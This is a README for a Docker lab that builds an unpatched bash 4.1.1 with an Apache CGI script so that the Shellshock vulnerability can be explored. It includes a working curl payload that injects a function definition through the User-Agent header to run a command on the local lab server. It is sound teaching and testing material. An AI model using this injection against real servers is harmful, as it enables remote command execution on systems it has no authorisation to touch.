# shellshock-lab

This is a playground to investigate and emulate the infamous `shellshock` vulnerability in `bash` (CVE-2014-6271, CVE-2014-7169, CVE-2014-7186 CVE-2014-7186).

## About Shellshock

// TODO

## Repo Content

- `image/` - contains everything that is needed to build a vulnerable, unpatched image of bash (`4.1.1`)

## Building the image

From within the image directory...

```bash
docker build -t shellshock-lab:latest .
```

## Running the container

```bash
docker run --rm -p 2222:22 -p 8080:80 -p 8443:443 -it shellshock-lab:latest
```

## Exploit using CGI scripts

The container runs an Apache server with a CGI script that is vulnerable to `shellshock`. The script is located at `/usr/lib/cgi-bin/submit-comment.cgi`,
and can be accessed via `http://localhost:8080/cgi-bin/submit-comment.cgi`.

`apache2` automatically sets the `User-Agent` header to the value of the `User-Agent` HTTP header. This means that the `User-Agent` header can be used to exploit the `shellshock` vulnerability.

```bash
curl --header 'User-Agent: () { :;}; /bin/bash -c "echo pwned > /tmp/test"' http://localhost:8080/cgi-bin/submit-comment.cgi
```
